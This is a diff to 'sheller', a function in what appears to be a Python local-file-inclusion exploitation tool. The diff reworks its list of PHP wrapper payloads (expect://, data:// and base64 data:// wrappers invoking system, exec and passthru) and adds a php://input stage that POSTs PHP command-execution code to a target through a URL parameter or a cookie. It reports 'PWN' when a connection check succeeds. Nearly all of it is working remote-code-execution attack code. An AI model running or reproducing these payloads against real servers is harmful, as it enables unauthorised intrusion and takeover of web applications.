@@ -578,7 +578,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
                 d += 1
                 if found:
-                    sys.stdout.write("{0} OK{1}\n".format(color.O, color.END))
+                    sys.stdout.write("{0} OK  {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
                     break
 
     if success:
@@ -761,7 +761,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     if app:
                         app.processEvents()
         elif technique == 6:
-            wrappers = [
+            wrappersPart1 = [
                 'expect://{}'.format(PAYLOAD),
                 'data://text/plain,<?php system("{}"); ?>'.format(PAYLOAD),
                 'data://text/plain,<?php exec("{}"); ?>'.format(PAYLOAD),
@@ -771,21 +771,21 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 'data://text/plain;base64,' + encode64('<?php passthru("{}"); ?>'.format(PAYLOAD))
             ]
 
-            names = [
-                "expect:                ",
-                "data - system():       ",
-                "data - exec():         ",
-                "data - passthru():     ",
-                "data(b64) - system():  ",
-                "data(b64) - exec():    ",
-                "data(b64) - passthru():"
+            namesPart1 = [
+                "expect:               ",
+                "data.system():        ",
+                "data.exec():          ",
+                "data.passthru():      ",
+                "data.b64.system():    ",
+                "data.b64.exec():      ",
+                "data.b64.passthru():  "
             ]
 
-            for i in range(0, len(wrappers)):
-                wrapper = wrappers[i]
-                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, names[i]))
+            for i in range(0, len(wrappersPart1)):
+                wrapper = wrappersPart1[i]
+                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, namesPart1[i]))
                 if gui:
-                    gui.crawlerResultDisplay.append("  : Trying {}".format(names[i]))
+                    gui.crawlerResultDisplay.append("  : {}".format(namesPart1[i]))
                     gui.show()
                     app.processEvents()
                 if attack == 1:
@@ -811,8 +811,50 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     showStatus(gui, timeout=True)
                     if app:
                         app.processEvents()
+
+            wrapper = "php://input"
+            payloads = [
+                '<?php system("{}"); ?>'.format(PAYLOAD),
+                '<?php exec("{}"); ?>'.format(PAYLOAD),
+                '<?php passthru("{}"); ?>'.format(PAYLOAD)
+            ]
+            names = ["php input.system():   ", "php input.exec():     ", "php input.passthru(): "]
+            for i in range(0, len(payloads)):
+                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, names[i]))
+                if gui:
+                    gui.crawlerResultDisplay.append("  : Trying {}".format(names[i]))
+                    gui.show()
+                    app.processEvents()
+                if attack == 1:
+                    if "?" not in url:
+                        cont = "?" + keyword + "=" + wrapper + url2
+                    else:
+                        cont = "&" + keyword + "=" + wrapper + url2
+                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
+                    prep = s.prepare_request(req)
+                elif attack == 3:
+                    s.cookies.set(selected, wrapper)
+                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
+                    prep = s.prepare_request(req)
+                else:
+                    prep = None
+                
+                if prep:
+                    try:
+                        s.send(prep, timeout=timeout)
+                        showStatus(gui)
+                        if app:
+                            app.processEvents()
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        showStatus(gui, timeout=True)
+                        if app:
+                            app.processEvents()
+                else:
+                    showStatus(gui, exception="Attack vector not supported.")
+                    if app:
+                        app.processEvents()
     else:
-        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\n")
             gui.show()
@@ -843,26 +885,26 @@ def showStatus(gui, timeout=False, exception=None):
     print status of RCE probe
     """
     if exception:
-        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
         print("{0}Exception:{1}\n{2}".format(color.O, color.END, exception))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\nException:\n{}\n".format(exception))
             gui.show()
         return
     if timeout:
-        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
         print("{0}Timeout{1}".format(color.O, color.END))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
             gui.show()
         return
     if checkConn():
-        sys.stdout.write("{0} PWN{1}\n".format(color.O, color.END))
+        sys.stdout.write("{0} PWN {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
         if gui:
             gui.crawlerResultDisplay.append(" PWN\n")
             gui.show()
     else:
-        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\n")
             gui.show()
